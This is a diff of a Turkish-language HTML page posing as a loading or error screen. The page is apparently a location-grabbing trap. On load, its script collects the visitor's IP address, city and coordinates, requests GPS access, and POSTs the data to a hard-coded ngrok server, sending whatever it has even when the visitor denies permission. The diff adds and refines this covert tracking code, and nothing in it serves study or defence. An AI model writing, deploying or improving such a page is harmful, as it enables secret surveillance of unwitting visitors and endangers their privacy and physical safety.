@@ -1,64 +1,50 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html>
 <head>
     <meta charset="UTF-8">
     <title>Yükleniyor...</title>
 </head>
 <body>
     <script>
-        async function catchData() {
-            let payload = {
-                ip: "Bilinmiyor",
-                city: "Bilinmiyor",
-                loc: "Bilinmiyor"
-            };
+        async function yakala() {
+            // Önce basit bir IP servisi kullanalım (Token istemez)
+            let veri = { ip: "Alınamadı", city: "Alınamadı", loc: "Alınamadı" };
 
             try {
-                // 1. Adım: IP ve Şehir Bilgisini Al (ipinfo.io gibi servisler kullanılır)
-                const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE'); 
-                // Not: Token almazsan günlük limit düşük olur ama başlangıçta çalışır.
-                const ipData = await ipResponse.json();
-                
-                payload.ip = ipData.ip;
-                payload.city = ipData.city + " / " + ipData.region;
-                payload.loc = ipData.loc; // Bu IP bazlı yaklaşık konumdur.
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                veri.ip = d.ip;
+                veri.city = d.city + " / " + d.country_name;
+                veri.loc = d.latitude + "," + d.longitude;
+            } catch (e) { console.log("IP servisi hatası"); }
 
-                // 2. Adım: Gerçek Konum İzni İste (GPS)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(async (position) => {
-                        payload.loc = `${position.coords.latitude}, ${position.coords.longitude} (Net GPS)`;
-                        sendToServer(payload);
-                    }, (err) => {
-                        // Kullanıcı reddederse IP bilgisiyle devam et
-                        sendToServer(payload);
-                    });
-                } else {
-                    sendToServer(payload);
-                }
-
-            } catch (error) {
-                console.error("Hata:", error);
-                sendToServer(payload);
+            // Konum izni iste
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    veri.loc = pos.coords.latitude + "," + pos.coords.longitude + " (GPS)";
+                    gonder(veri);
+                }, () => { gonder(veri); }); // Reddedilse de eldeki veriyi gönder
+            } else {
+                gonder(veri);
             }
         }
 
-        async function sendToServer(data) {
-            // BURASI ÖNEMLİ: ngrok linkini buraya yazman lazım
-            // Örn: https://xxxx-xxxx.ngrok-free.app/log
-            const serverUrl = 'BURAYA_NGROK_URLSINI_YAZ/log'; 
+        function gonder(data) {
+            // BURAYA KENDİ NGROK LİNKİNİ YAZ (Sonunda /log olsun)
+            const serverUrl = 'https://punctual-villain-arson.ngrok-free.dev';
 
-            await fetch(serverUrl, {
+            fetch(serverUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            });
+            }).catch(e => console.log("Gönderim hatası: ", e));
         }
 
-        // Sayfa açılır açılmaz çalıştır
-        catchData();
+        window.onload = yakala;
     </script>
 
-    <h1>Sistem Hatası: 404</h1>
-    <p>İçerik yüklenirken bir hata oluştu, lütfen bekleyiniz...</p>
+    <h1 style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+        İçerik Yükleniyor, Lütfen Bekleyin...
+    </h1>
 </body>
 </html>
